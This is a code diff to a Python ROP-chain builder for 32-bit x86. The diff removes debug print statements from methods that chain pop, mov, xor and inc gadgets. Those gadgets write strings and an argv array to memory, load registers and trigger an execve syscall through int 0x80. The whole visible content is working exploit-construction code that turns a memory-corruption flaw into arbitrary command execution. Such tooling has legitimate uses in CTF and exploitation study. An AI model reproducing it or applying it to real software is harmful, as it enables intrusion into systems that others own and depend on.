@@ -153,29 +153,27 @@ class ROPChainBuilder:
                     chunk = chunk + b'\x00' * (4-len(chunk))
 
                 # POP EDX (Destination Address)
-                print("pop edx")
+
                 buff += self.add_gadget(self.pop_edx,'edx', pack("<I", stack_cursor))
-                # Update self.current_register_vals
 
                 # POP EAX (String Chunk)
-                print("pop eax")
+
                 buff += self.add_gadget(self.pop_eax,'eax', chunk)
-                # Update self.current_register_vals
 
 
                 # MOV [EDX], EAX
-                print("mov [edx], eax")
+
                 buff += self.add_gadget(self.mov_istack)
 
                 
                 stack_cursor += 4
 
             # Write the Null Terminator for this specific string
-            print("pop edx")
+           
             buff += self.add_gadget(self.pop_edx,'edx', pack("<I", stack_cursor))
-            print("xor eax")
+           
             buff += self.add_gadget(self.xor_eax) # EAX = 0
-            print("mov [edx], eax")
+           
             buff += self.add_gadget(self.mov_istack)     # Write 0 to stack
             
             # Save where this string started
@@ -190,47 +188,47 @@ class ROPChainBuilder:
         
         for addr in string_addresses:
             # Write Address of string N to stack
-            print("pop edx")
+
             buff += self.add_gadget(self.pop_edx,'edx', pack("<I", stack_cursor))
-            print("pop eax")
+
             buff += self.add_gadget(self.pop_eax,'eax', pack("<I", addr))
-            print("mov [edx], eax")
+
             buff += self.add_gadget(self.mov_istack)
             stack_cursor += 4
 
         # Null pointer at end of argv array
-        print("pop edx")
+
         buff += self.add_gadget(self.pop_edx,'edx', pack("<I", stack_cursor))
-        print("pop eax")
+    
         buff += self.add_gadget(self.pop_eax,'eax', pack("<I", 0))
-        print("mov [edx], eax")
+       
         buff += self.add_gadget(self.mov_istack)
         stack_cursor += 4
 
         # --- 4. Load Registers for execve ---
         # EBX = Pointer to filename (first string)
-        print("pop ebx")
+      
         buff += self.add_gadget(self.pop_ebx,'ebx', pack("<I", string_addresses[0]))
 
         # ECX = Pointer to argv array
-        print("pop ecx")
+       
         buff += self.add_gadget(self.pop_ecx,'ecx', pack("<I", argv_start))
         # print("pop ebx")
         # buff += self.add_gadget(self.pop_ebx, pack("<I", string_addresses[0]), self.dummy_bytes)  # NULL envp
         # EDX = 0 (Environment pointer, NULL)
-        print("pop edx")
+
         buff += self.add_gadget(self.pop_edx,'edx', pack("<I", 0))
 
         # EAX = 11 (execve syscall number)
         buff += self.add_gadget(self.xor_eax)
         
         # Handle INCEAX loop (Need to unpack tuple inside loop)
-        print("inc eax")
+
         inc_inst, inc_junk,inc_affected = self.inc_eax
         for _ in range(11):
             buff += inc_inst
             buff += self.dummy_bytes * inc_junk
-        print("eax set to 11")
+
         # --- 5. Trigger ---
         buff += self.add_gadget(self.int_80)
 
